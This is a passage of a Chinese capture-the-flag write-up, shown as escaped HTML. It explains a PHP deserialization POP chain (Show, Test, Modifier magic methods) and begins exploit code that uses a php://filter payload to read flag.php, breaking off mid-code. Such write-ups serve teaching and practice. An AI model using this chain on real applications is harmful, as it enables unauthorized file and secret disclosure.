variable&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$function&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;pop&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    @&lt;span class=&#34;token function&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;pop&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Show&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;下面按新手的步骤来，先分开解读一下：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; Modifier &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;protected&lt;/span&gt;  &lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__invoke&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;function append：很明显的 incloud 包含漏洞，可以利用来读 flag&lt;/p&gt;
&lt;p&gt;function __invoke ()：调用 append 读取 flag；invoke 方法在 当一个对象被当做函数调用时，调用该方法。&lt;/p&gt;
&lt;p&gt;思路：让 &lt;code&gt;var=php://filter/read=convert.base64-encode/resource=flag.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;​			只要 invoke 被回调就能读取 flag，只需让一个对象被当作函数调用。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; Show&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;index.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;source&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Welcome to &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__toString&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__wakeup&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;hacker&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;source&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;index.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;function __construct：通过 file 给 source 赋值；当一个对象被实例化（new）时回调&lt;/p&gt;
&lt;p&gt;function __toString ()：返回 str 中的 source；当一个对象被当做字符串调用或输出时回调&lt;/p&gt;
&lt;p&gt;function __wakeup ()：过滤；在但序列化时自动回调&lt;/p&gt;
&lt;p&gt;思路：这三个方法看着没什么联系，但是却因为先后关系能被链起来。如果让 file 等于一个对象（实例化的 class）&lt;/p&gt;
&lt;p&gt;​			那么在反序列化时调用的 wakeup 方法中，就会引起连锁反应（正则匹配会把 source 当成字符串）&lt;/p&gt;
&lt;p&gt;​			从而调用了 tostring 方法，返回 str 中的 source&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; Test&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__get&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$function&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;function __construct ()：将变量 p 变成一个数组；调用方法同前面&lt;/p&gt;
&lt;p&gt;function __get ()：调用了一个函数，名字为 function；访问私有属性或不存在的属性时，自动回调&lt;/p&gt;
&lt;p&gt;思路：提示的很明显，在 get 方法中，function 函数被调用&lt;/p&gt;
&lt;p&gt;​			所以只要 function 是个对象，就会调用 class Modifier 中的 function __invoke ()，读取 flag&lt;/p&gt;
&lt;p&gt;​			要让 function 为对象，只需要让 function __construct () 中的 &lt;code&gt;$this-&amp;gt;p = new Modifier();&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;​			然后只需要 实例化 class Test 且触发__get () 方法 即可获得 flag&lt;/p&gt;
&lt;p&gt;​			现在问题是，如何访问一个私有或不存在的属性触发 get？肯定是通过还没使用的 class show&lt;/p&gt;
&lt;p&gt;​			根据 class show 中的结果，return 了一个 str 中的 source，那么当 str 被赋值为一个实例化对象后&lt;/p&gt;
&lt;p&gt;​			只要该对象没有 source 属性，就可以触发__get () 方法，而刚好 Test 中没有 source。&lt;/p&gt;
&lt;p&gt;​			而且让  &lt;code&gt;str = new Test()&lt;/code&gt;  还能顺便实例化了 Test 类，同时满足了俩条件&lt;/p&gt;
&lt;p&gt;​			至此，这一条链就连起来了！&lt;/p&gt;
&lt;p&gt;总结一下思路：&lt;/p&gt;
&lt;p&gt;​			&lt;strong&gt;通过 show 的 __wakeup ()，调用__toString ()，调用 test 的__get ()，调用 Modifier 的__invoke ()&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;写代码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; Modifier &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;protected&lt;/span&gt;  &lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Show&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token 